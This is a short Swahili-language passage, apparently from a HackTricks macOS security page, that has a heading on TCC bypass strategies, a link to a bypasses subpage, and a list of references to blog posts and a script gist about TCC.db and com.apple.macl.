### Mikakati ya kukwepa TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Marejeo

- [1] [Uchambuzi wa kina wa macOS TCC.db - Blogu ya Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script ya kufuatilia com.apple.macl (Gist ya brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Kufuatilia na kushughulikia com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Kukwepa kwa bahati mbaya na kwa makusudi ulinzi wa faragha wa mtumiaji wa macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
